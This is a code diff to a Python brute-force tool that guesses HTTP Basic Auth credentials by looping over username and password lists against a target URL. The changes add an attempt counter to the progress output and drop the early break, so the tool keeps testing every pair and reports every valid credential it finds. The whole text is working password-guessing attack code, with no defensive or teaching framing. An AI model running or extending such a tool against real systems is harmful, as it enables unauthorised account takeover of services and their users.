@@ -43,8 +43,8 @@ def printout():
 	if args.passwords:
 		print("Passwords:	"+args.passwords.name)
 	print("\n___________________________________________________________________\n")
-def request(url, user, passw):
-	print("\x1b[1K\rbruting.... " + user + ":" + passw, end='')
+def request(enum, url, user, passw):
+	print("\x1b[1K\r" + enum + " bruting.... " + user + ":" + passw, end='')
 	r = requests.get(url,auth=HTTPBasicAuth(user, passw))
 	return r
 
@@ -68,19 +68,22 @@ def parse_cred_lists():
 	return u_list,p_list
 
 def enumerate(u_list,p_list):
+	enumerator = 0
+	denominator = len(u_list)*len(p_list)
 	found = []
 	for u in u_list:
 		for p in p_list:
-			r = request(args.url, u, p)
+			enumerator+=1
+			enum = "[" + str(enumerator) + "/" + str(denominator) + "]"
+			r = request(enum, args.url, u, p)
 			if r.status_code == 200:
 				print("   CORRECT CREDENTIALS FOUND")
 				found.append((u,p))
-				break
-	done(found)
+	done(enum, found)
 
-def done(found):
+def done(enum, found):
 	print("\x1b[1K\r")
-	print("FINISHED")
+	print(enum + " FINISHED")
 	if len(found)>0:
 		print("Found credentials:")
 		for i in found:
